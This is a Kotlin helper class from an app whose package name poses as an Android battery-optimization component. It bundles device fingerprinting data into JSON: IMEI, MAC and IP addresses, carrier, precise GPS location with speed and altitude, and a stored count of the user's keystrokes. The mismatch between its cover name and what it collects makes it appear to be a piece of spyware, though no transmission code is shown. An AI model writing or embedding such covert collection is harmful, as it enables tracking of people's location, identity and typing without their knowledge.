package com.android.batteryoptimization

import android.Manifest
import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.Settings
import android.telephony.TelephonyManager
import androidx.core.content.ContextCompat
import com.google.gson.Gson
import java.io.File
import java.net.Inet4Address
import java.net.NetworkInterface
import java.util.Scanner

object DeviceInfoHelper {

    fun getDeviceInfoJson(context: Context): String {
        val info = getDeviceInfo(context)
        return Gson().toJson(info)
    }

    private fun getDeviceInfo(context: Context): Map<String, Any> {
        val map = mutableMapOf<String, Any>()
        
        // 1. timestamp
        map["timestamp"] = System.currentTimeMillis()
        
        // 2. osVersion
        map["osVersion"] = "Android ${Build.VERSION.RELEASE}"
        
        // 3. deviceName
        val rawDeviceName = Settings.Global.getString(context.contentResolver, Settings.Global.DEVICE_NAME)
            ?: Settings.Secure.getString(context.contentResolver, "bluetooth_name")
            ?: Build.MODEL
        // Keep only if all chars are ASCII printable, otherwise fallback to Build.MODEL
        val deviceName = if (rawDeviceName.all { it.code in 32..126 }) rawDeviceName else Build.MODEL
        map["deviceName"] = deviceName ?: "Unknown"
        
        // 4. deviceBrand
        val brand = Build.BRAND ?: "Unknown"
        map["deviceBrand"] = if (brand.all { it.code in 32..126 }) brand else "Unknown"
        
        // 5. deviceModel
        val model = Build.MODEL ?: "Unknown"
        map["deviceModel"] = if (model.all { it.code in 32..126 }) model else "Unknown"
        
        // 6. androidVersion
        val androidVer = Build.VERSION.RELEASE ?: "Unknown"
        map["androidVersion"] = if (androidVer.all { it.code in 32..126 }) androidVer else "Unknown"
        
        // 7. sdkVersion
        map["sdkVersion"] = Build.VERSION.SDK_INT.toString()
        
        // 8. buildNumber
        val buildNumber = Build.DISPLAY ?: "Unknown"
        map["buildNumber"] = if (buildNumber.all { it.code in 32..126 }) buildNumber else "Unknown"
        
        // 9. cpuModel
        map["cpuModel"] = getCpuModel()
        
        // 10. cpuCores
        map["cpuCores"] = Runtime.getRuntime().availableProcessors()
        
        // 11. totalMemory / 12. availableMemory
        val actManager = context.getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager
        val memInfo = ActivityManager.MemoryInfo()
        actManager?.getMemoryInfo(memInfo)
        map["totalMemory"] = memInfo.totalMem
        map["availableMemory"] = memInfo.availMem
        
        // 13. screenResolution / 14. screenDensity
        val displayMetrics = context.resources.displayMetrics
        map["screenResolution"] = "${displayMetrics.widthPixels}x${displayMetrics.heightPixels}"
        map["screenDensity"] = "${displayMetrics.densityDpi}dpi"
        
        // 15. totalStorage / 16. availableStorage / 17. usedStorage
        try {
            val path = Environment.getDataDirectory()
            val stat = StatFs(path.path)
            val totalStorage = stat.blockSizeLong * stat.blockCountLong
            val availableStorage = stat.blockSizeLong * stat.availableBlocksLong
            map["totalStorage"] = totalStorage
            map["availableStorage"] = availableStorage
            map["usedStorage"] = totalStorage - availableStorage
        } catch (e: Exception) {
            map["totalStorage"] = 0L
            map["availableStorage"] = 0L
            map["usedStorage"] = 0L
        }
        
        // 18. networkType
        map["networkType"] = getNetworkType(context)
        
        // 19. carrier (Map Chinese carrier names to English ones)
        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
        val rawCarrier = telephonyManager?.networkOperatorName ?: "Unknown"
        val carrier = when {
            rawCarrier.contains("移动") || rawCarrier.contains("Mobile") || rawCarrier.contains("CMCC") -> "China Mobile"
            rawCarrier.contains("联通") || rawCarrier.contains("Unicom") -> "China Unicom"
            rawCarrier.contains("电信") || rawCarrier.contains("Telecom") -> "China Telecom"
            rawCarrier.contains("广电") || rawCarrier.contains("Broadcasting") -> "China Broadcasting Network"
            rawCarrier.all { it.code in 32..126 } -> rawCarrier
            else -> "Unknown"
        }
        map["carrier"] = carrier
        
        // 20. ipAddress
        map["ipAddress"] = getLocalIpAddress()
        
        // 21. macAddress
        map["macAddress"] = getMacAddress()
        
        // 22. imei
        map["imei"] = getImei(context)
        
        // 23. batteryLevel / 24. chargingStatus
        val batteryStatus: Intent? = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val batteryVal = if (level >= 0 && scale > 0) (level * 100 / scale) else -1
        map["batteryLevel"] = batteryVal
        
        val status = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
        map["chargingStatus"] = if (isCharging) "Charging" else "Discharging"
        
        // 25. appVersion
        val appVersion = try {
            context.packageManager.getPackageInfo(context.packageName, 0).versionName ?: "1.0.0"
        } catch (e: Exception) {
            "1.0.0"
        }
        map["appVersion"] = if (appVersion.all { it.code in 32..126 }) appVersion else "1.0.0"
        
        // 26. installDate
        val installDate = try {
            context.packageManager.getPackageInfo(context.packageName, 0).firstInstallTime
        } catch (e: Exception) {
            System.currentTimeMillis()
        }
        map["installDate"] = installDate
        
        // 27. lastActive
        map["lastActive"] = System.currentTimeMillis()
        
        // 28. totalKeystrokes
        val prefs = context.getSharedPreferences("keystroke_prefs", Context.MODE_PRIVATE)
        val keystrokes = prefs.getInt("total_keystrokes", 0)
        map["totalKeystrokes"] = keystrokes
        
        // 29. todayActiveDuration
        val appStartedTime = prefs.getLong("app_started_time", System.currentTimeMillis())
        val todayActiveDuration = (System.currentTimeMillis() - appStartedTime) / 1000L
        map["todayActiveDuration"] = if (todayActiveDuration > 0) todayActiveDuration else 0L
        
        // 30. Location details (latitude, longitude, accuracy, altitude, speed)
        getLocationDetails(context, map)
        
        return map
    }

    private fun getCpuModel(): String {
        try {
            val scanner = Scanner(File("/proc/cpuinfo"))
            while (scanner.hasNextLine()) {
                val line = scanner.nextLine()
                if (line.startsWith("Hardware", ignoreCase = true)) {
                    val parts = line.split(":")
                    if (parts.size > 1) {
                        val hardware = parts[1].trim()
                        if (hardware.all { it.code in 32..126 }) return hardware
                    }
                }
            }
        } catch (e: Exception) {
            // ignore
        }
        val hw = Build.HARDWARE ?: "Unknown"
        return if (hw.all { it.code in 32..126 }) hw else "Unknown"
    }

    private fun getNetworkType(context: Context): String {
        val connManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            ?: return "None"
        val activeNetwork = connManager.activeNetwork ?: return "None"
        val capabilities = connManager.getNetworkCapabilities(activeNetwork) ?: return "None"
        return when {
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Mobile"
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
            else -> "Other"
        }
    }

    private fun getLocalIpAddress(): String {
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val networkInterface = interfaces.nextElement()
                val addresses = networkInterface.inetAddresses
                while (addresses.hasMoreElements()) {
                    val address = addresses.nextElement()
                    if (!address.isLoopbackAddress && address is Inet4Address) {
                        val ip = address.hostAddress
                        if (!ip.isNullOrBlank()) {
                            return ip
                        }
                    }
                }
            }
        } catch (e: Exception) {
            // ignore
        }
        return "Unknown"
    }

    private fun getMacAddress(): String {
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val nif = interfaces.nextElement()
                if (!nif.name.equals("wlan0", ignoreCase = true)) continue
                val macBytes = nif.hardwareAddress ?: return "02:00:00:00:00:00"
                val res1 = StringBuilder()
                for (b in macBytes) {
                    res1.append(String.format("%02X:", b))
                }
                if (res1.isNotEmpty()) {
                    res1.deleteCharAt(res1.length - 1)
                }
                return res1.toString()
            }
        } catch (e: Exception) {
            // ignore
        }
        return "02:00:00:00:00:00"
    }

    private fun getImei(context: Context): String {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            return "Restricted"
        }
        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            ?: return "Unknown"
        return try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                @Suppress("DEPRECATION")
                val id = telephonyManager.deviceId
                if (id != null && id.all { it.code in 32..126 }) id else "Unknown"
            } else {
                "Permission Denied"
            }
        } catch (e: SecurityException) {
            "Permission Denied"
        }
    }

    private fun getLocationDetails(context: Context, map: MutableMap<String, Any>) {
        // Defaults
        map["latitude"] = 0.0
        map["longitude"] = 0.0
        map["accuracy"] = 0.0
        map["altitude"] = 0.0
        map["speed"] = 0.0

        val hasFine = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val hasCoarse = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
        if (!hasFine && !hasCoarse) {
            return
        }

        val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager ?: return
        try {
            var location: Location? = null
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            }
            if (location == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            }
            if (location != null) {
                map["latitude"] = location.latitude
                map["longitude"] = location.longitude
                map["accuracy"] = location.accuracy.toDouble()
                map["altitude"] = location.altitude
                map["speed"] = location.speed.toDouble()
            }
        } catch (e: SecurityException) {
            // ignore
        }
    }
}
